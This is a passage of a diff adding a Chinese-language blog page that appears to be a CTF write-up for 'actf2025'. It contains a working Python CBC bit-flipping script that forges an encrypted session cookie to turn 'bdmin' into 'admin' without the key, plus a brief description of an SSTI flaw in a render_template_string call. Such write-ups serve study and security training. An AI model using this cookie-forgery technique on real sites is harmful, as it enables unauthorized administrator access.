+        cookie = unquote(original_cookie)
+        cookie = re.sub(r"[^a-zA-Z0-9+/=]", "", cookie)
+        pad_len = (4 - len(cookie) % 4) % 4
+        cookie += "=" * pad_len
+        decoded = base64.b64decode(cookie)
+
+        # 2. 分割数据块
+        iv = bytearray(decoded[:16])
+        ciphertext = bytearray(decoded[16:])
+        blocks = [iv] + [ciphertext[i:i + 16] for i in range(0, len(ciphertext), 16)]
+
+        # 3. 需要手动指定目标位置（根据经验或尝试）
+        # 假设"bdmin"出现在第一个块，偏移量为10
+        block_idx = 0  # 修改IV块（第一个块）
+        offset_in_block = 10  # 需要根据实际情况调整
+
+        # 4. 计算需要修改的字节
+        modifications = []
+        for i in range(min(len(target_old), len(target_new))):
+            if i &gt;= len(target_old) or i &gt;= len(target_new):
+                break
+
+            if target_old[i] == target_new[i]:
+                continue
+
+            flip = ord(target_old[i]) ^ ord(target_new[i])
+            blocks[block_idx][offset_in_block + i] ^= flip
+            modifications.append(
+                f"修改 block[{block_idx}][{offset_in_block + i}]: "
+                f"{target_old[i]}→{target_new[i]} (异或 {flip:02x})"
+            )
+
+        if not modifications:
+            print("[!] 无需修改 - 字符串已匹配")
+            return original_cookie
+
+        # 5. 生成伪造的Cookie
+        forged_payload = b''.join(blocks)
+        forged_cookie = base64.b64encode(forged_payload).decode()
+
+        print("\n[攻击详情]")
+        for mod in modifications:
+            print(f"- {mod}")
+        print(f"\n[+] 伪造的Cookie (无需KEY):\n{forged_cookie}")
+        return forged_cookie
+
+    except Exception as e:
+        print(f"[!] 攻击失败: {type(e).__name__}: {str(e)}")
+        return None
+
+
+# 测试用例
+if __name__ == "__main__":
+    # 替换为你的实际Cookie
+    test_cookie = "uP/CTaX6zXoTSPkygDAYzjltlpBRUBLIosVtwY/b3Vy+k89A3sazG8Dyu2iDeJQvaT5aXhi7Yx+8qOfUtcnacv3o07rt0Wx5bWBOdYb7joqBE6kYwAhACQR76+Cm4rwu"
+
+    print("=== CBC位翻转攻击（无需KEY）===")
+    forged = cbc_bitflip_attack_without_key(
+        test_cookie,
+        target_old="bdmin",
+        target_new="admin"
+    )
+
+    if forged:
+        print("\n[+] 请用此Cookie尝试访问管理员页面")
+        print("注意：可能需要尝试不同的偏移量")
+    else:
+        print("\n[-] 攻击失败，请尝试调整偏移量")</code></pre>
+<p>攻击成功</p>
+<p><img src="/images/actf2025/6.png" alt="6"></p>
+<p>在home路由下，使用了<code>%s</code>格式化字符串到渲染模板里，存在SSTI漏洞</p>
+<pre><code class="language-python">return render_template_string(html_template)</code></pre>
+<p>梭哈</p>
+<p><img src="/images/actf2025/7.png" alt="7"></p>    </div>
+        <div class="post-meta-footer">
+                    <span class="post-meta-item">分类:
+                                    <span>wp</span>
+                            </span>
+                            <span class="post-meta-item">标签:
+                                    <span>#比赛</span>
+                                    <span>#ctf</span>
+                                    <span>#wp</span>
+                            </span>
+            </div>
+    </article>
+
+            </main>
+                <aside class="post-toc" aria-label="Table of contents">
+        <div class="toc-title">目录</div>
+        <nav class="toc-list"></nav>
+    </aside>
+            </div>
+        <button id="backToTop" class="fab fab-top" type="button" aria-label="返回顶部" title="返回顶部">↑</button>
+    <button id="themeToggle" class="theme-toggle" type="button" aria-label="切换主题" title="切换主题"></button>
+    <script src="/assets/js/site.js"></script>
+        <script src="/assets/js/navReveal.js"></script>
+        <script src="/assets/js/readingProgress.js"></script>
+            <script src="/assets/js/imageEnhance.js"></script>
+        <!-- 启动代码高亮及行号显示 -->
+    <script src="/assets/prism/prism.js"></script>
+    <script src="/assets/prism/prism-line-number.js"></script>
+    <!-- 主题切换 -->
+    <script src="/assets/js/ThemeSwitch.js"></script>
+</body>
+</html>
